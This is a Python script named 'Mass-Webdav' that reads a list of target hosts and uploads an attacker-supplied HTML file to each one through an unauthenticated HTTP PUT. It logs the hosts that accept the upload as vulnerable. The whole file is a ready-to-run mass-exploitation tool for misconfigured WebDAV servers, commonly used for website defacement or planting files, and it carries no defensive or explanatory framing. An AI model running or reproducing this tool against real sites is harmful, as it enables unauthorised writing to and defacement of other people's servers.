import requests
import sys

print("""
 
   _____                                    __      __      ___.        .___            
  /     \ _____    ______ ______           /  \    /  \ ____\_ |__    __| _/____ ___  __
 /  \ /  \\__  \  /  ___//  ___/   ______  \   \/\/   // __ \| __ \  / __ |\__  \\  \/ /
/    Y    \/ __ \_\___ \ \___ \   /_____/   \        /\  ___/| \_\ \/ /_/ | / __ \\   / 
\____|__  (____  /____  >____  >             \__/\  /  \___  >___  /\____ |(____  /\_/  
        \/     \/     \/     \/                   \/       \/    \/      \/     \/       
 
 """

	   

)
if len(sys.argv) != 3:
 print("\n\033[34;1m[*]\033[0m python "+sys.argv[0]+" list.txt scrip.html")
 exit(0)

print("\n\033[34;1m[*]\033[0m Mass-Webdav \n\033[34;1m[*]\033[0m Author : Boychongzen aka Xroot\n\033[34;1m[*]\033[0m Github : https://github.com/boychongzen18\n")

target = open(sys.argv[1], 'r')
while True:
 scheker = open(sys.argv[2]).read()
 sukses = open('vuln_result.txt', 'a')
 host = target.readline().replace('\n','')
 if not host:
  break
 if not host.startswith('http'):
  host = 'http://' + host
 outname = '/'+sys.argv[2]
 print('\033[34;1m[*]\033[0m Sending Files : '+sys.argv[2])
 print('\033[34;1m[*]\033[0m Size File     : '+str(len(scheker)))
 print('\033[34;1m[*]\033[0m Target Vuln        : '+host)
 try:
    r = requests.request('put', host + outname, data=scheker, headers={'Content-Type':'application/octet-stream'})
 except:
    print('\033[31;1m[-]\033[0m Not Vuln Cuks        : Null Respone\n')
    pass
    continue
 if r.status_code == 200:
  print('\033[32;1m[+]\033[0m Vuln Cuks        : '+host+outname+'\n')
  sukses.write(host+outname+'\n')
 else:
  print('\033[31;1m[-]\033[0m Not Vuln Cuks        : '+host+outname+'\n')

print("\033[34;1m[*]\033[0m Output Saved On : vuln_output.txt")
